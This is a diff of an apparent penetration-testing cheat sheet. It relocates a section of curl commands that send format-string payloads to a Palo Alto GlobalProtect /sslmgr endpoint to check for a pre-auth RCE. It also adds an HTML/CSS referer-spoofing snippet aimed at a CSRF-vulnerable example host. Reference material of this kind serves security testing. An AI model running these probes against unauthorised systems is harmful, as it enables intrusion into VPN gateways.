@@ -461,12 +461,11 @@
 	# FTP
 		python -m pyftpdlib --directory=/tmp/dir/ --port=21
     
-### General useful commands
-	# Trim space and newlines on bash variable
-		"${i//[$'\t\r\n ']}"
-		
-	# GTFOBins is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.
-		https://gtfobins.github.io/
+### Check PreAuth RCE on Palo Alto GlobalProtect
+	https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
+		time curl -s -d 'scep-profile-name=%9999999c' https://${HOST}/sslmgr >/dev/null
+		time curl -s -d 'scep-profile-name=%99999999c' https://${HOST}/sslmgr >/dev/null
+		time curl -s -d 'scep-profile-name=%999999999c' https://${HOST}/sslmgr >/dev/null
 
 ### Generic Tools
 	The Cyber Swiss Army Knife
@@ -475,8 +474,15 @@
 	Pcap analysis and samples
 		https://packettotal.com/
 
-### Check PreAuth RCE on Palo Alto GlobalProtect
-	https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
-		time curl -s -d 'scep-profile-name=%9999999c' https://${HOST}/sslmgr >/dev/null
-		time curl -s -d 'scep-profile-name=%99999999c' https://${HOST}/sslmgr >/dev/null
-		time curl -s -d 'scep-profile-name=%999999999c' https://${HOST}/sslmgr >/dev/null
+### General
+	# Trim space and newlines on bash variable
+		"${i//[$'\t\r\n ']}"
+		
+	# GTFOBins is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.
+		https://gtfobins.github.io/
+	
+	# Referer spoofing
+		<base href="https://www.google.com/">
+		<style>
+    			@import 'https://CSRF.vulnerable.example/';
+		</style>
